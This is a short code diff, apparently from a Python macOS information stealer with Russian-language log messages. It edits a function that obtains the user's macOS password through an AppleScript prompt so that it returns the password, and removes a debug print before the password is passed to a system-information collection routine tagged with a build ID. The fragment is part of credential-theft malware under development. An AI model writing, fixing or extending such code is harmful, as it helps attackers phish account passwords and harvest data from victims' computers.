@@ -583,7 +583,7 @@ def get_macos_password_via_applescript(password: str | None) -> Optional[str]:
         else:
             s_t_t_t("Пароль не предоставлен")
     s_t_t_t("Не удалось получить пароль macOS после всех попыток")
-    return None
+    return password
 
 
 def collect_system_info(password: str, build_id: str, output_path: str) -> Optional[str]:
@@ -766,7 +766,6 @@ def s_mc(password: str | None):
                 return
 
     try:
-        print(password)
         collect_system_info(password, BuildID, out_paths["Base"])
     except Exception as e:
         s_t_t_t(f"Ошибка при сборе системной информации: {e}")
